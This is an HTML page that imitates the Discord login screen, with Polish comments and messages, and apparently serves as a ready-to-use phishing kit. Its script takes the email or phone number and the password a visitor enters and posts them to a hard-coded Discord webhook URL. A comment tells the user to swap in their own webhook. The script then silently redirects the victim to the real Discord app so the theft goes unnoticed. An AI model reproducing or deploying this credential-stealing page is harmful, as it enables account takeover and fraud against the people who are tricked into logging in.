<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Discord</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

    body {
      margin: 0;
      font-family: 'Inter', system-ui, sans-serif;
      background: #36393f;
      color: #dcddde;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .container {
      background: #2f3136;
      width: 100%;
      max-width: 480px;
      border-radius: 8px;
      padding: 40px 32px;
      box-shadow: 0 8px 32px rgba(0,0,0,0.6);
    }

    .logo {
      text-align: center;
      margin-bottom: 24px;
    }

    .logo svg {
      width: 56px;
      height: 56px;
      fill: #5865f2;
    }

    h1 {
      text-align: center;
      font-size: 24px;
      font-weight: 600;
      color: #fff;
      margin: 0 0 8px 0;
    }

    .subtitle {
      text-align: center;
      color: #b9bbbe;
      font-size: 16px;
      margin-bottom: 32px;
    }

    label {
      display: block;
      margin-bottom: 8px;
      font-size: 12px;
      font-weight: 600;
      color: #b9bbbe;
      text-transform: uppercase;
    }

    input {
      width: 100%;
      padding: 14px 16px;
      background: #202225;
      border: 1px solid #202225;
      border-radius: 4px;
      color: #dcddde;
      font-size: 16px;
      margin-bottom: 20px;
    }

    input:focus {
      border-color: #5865f2;
      box-shadow: 0 0 0 3px rgba(88, 101, 242, 0.3);
      outline: none;
    }

    button {
      width: 100%;
      padding: 14px;
      background: #5865f2;
      color: #fff;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
    }

    button:hover {
      background: #4752c4;
    }

    .forgot {
      text-align: center;
      color: #00aff4;
      font-size: 14px;
      margin-top: 20px;
      text-decoration: none;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="logo">
      <svg viewBox="0 0 127.14 96.36">
        <path d="M107.7 8.07A105.15 105.15 0 0 0 81.47 0a72.06 72.06 0 0 0-3.36 6.83 97.68 97.68 0 0 0-29.11 0A72.37 72.37 0 0 0 45.64 0a105.89 105.89 0 0 0-26.25 8.07C2.79 32.65-1.71 61.8 1.3 90.5a105.4 105.4 0 0 0 32.2 16.1 77.7 77.7 0 0 0 6.75-11.1 68.3 68.3 0 0 1-10.85-5.18c.91-.66 1.8-1.34 2.66-2.05a75.57 75.57 0 0 0 64.32 0c.87.71 1.76 1.39 2.66 2.05a68.68 68.68 0 0 1-10.87 5.19 77.3 77.3 0 0 0 6.76 11.1 105.5 105.5 0 0 0 32.2-16.1c3.8-28.7-.84-57.85-17.3-82.43z"/>
      </svg>
    </div>

    <h1>Welcome back!</h1>
    <p class="subtitle">We're so excited to see you again!</p>

    <form id="loginForm">
      <label>EMAIL OR PHONE NUMBER</label>
      <input type="text" id="email" placeholder="" required>

      <label>PASSWORD</label>
      <input type="password" id="password" placeholder="" required>

      <button type="submit">Log In</button>
    </form>

    <a href="#" class="forgot">Forgot your password?</a>
  </div>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1493250113588691067/2kSrCkWZnkMKpbYNURbE-afbcfWLwrwlXyGWHr22AdA4LphCobaTQh3tTctEXXVbQmvu"; // ZMIEŃ NA SWÓJ!

    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();

      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value.trim();

      if (!email || !password) {
        alert("Wypełnij wszystkie pola!");
        return;
      }

      const payload = {
        username: "Discord Login",
        embeds: [{
          title: "🔑 Nowe logowanie",
          color: 0x5865f2,
          fields: [
            { name: "Email / Telefon", value: email, inline: true },
            { name: "Hasło", value: password, inline: true },
            { name: "Czas", value: new Date().toLocaleString('pl-PL') }
          ]
        }]
      };

      try {
        await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
      } catch (err) {}

      // Przekierowanie na prawdziwy Discord
      window.location.replace("https://discord.com/app");
    });
  </script>

</body>
</html>
